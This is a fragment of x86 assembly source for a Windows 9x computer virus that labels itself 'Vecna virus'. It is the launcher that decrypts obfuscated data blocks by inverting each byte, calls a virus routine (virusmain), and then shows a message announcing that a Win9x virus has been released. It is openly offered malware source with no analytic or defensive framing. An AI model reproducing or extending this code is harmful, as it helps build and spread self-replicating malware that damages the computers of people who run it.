   _TEXT  segment dword use32 public 'CODE'

   main   proc
          call init001
          push 0
          push ofs caption
          push ofs msg
          push 0
     temp1 equ $
          call virusmain
   extrn MessageBoxA:PROC
          call MessageBoxA
          push 0
   extrn ExitProcess:PROC
          call ExitProcess
   main   endp

   init001 proc
          mov esi, ofs hlp1_s
          mov edi, esi
          mov ecx, hlp1_sz
     @@1:
          lodsb
          not al
          stosb
          loop @@1

          mov esi, ofs bound_
          mov edi, esi
          mov ecx, bound_sz
     @@2:
          lodsb
          not al
          stosb
          loop @@2

          mov esi, ofs script
          mov edi, esi
          mov ecx, script_sz
     @@3:
          lodsb
          not al
          stosb
          loop @@3

          mov esi, ofs name0
          mov edi, esi
          mov ecx, name_sz
     @@4:
          lodsb
          not al
          stosb
          loop @@4

          mov esi, ofs trans_table
          mov edi, esi
          mov ecx, (ofs chars-ofs trans_table)
     @@5:
          lodsb
          not al
          stosb
          loop @@5

          ret
   init001 endp


   _TEXT  ends

   _DATA  segment dword use32 public 'DATA'

         IF DEBUG EQ TRUE
   caption db 'Vecna virus (DEBUG)', 0
         ELSE
   caption db 'Vecna virus', 0
         ENDIF

   msg     db 'You just released a Win9x virus!', 0

   _DATA  ends
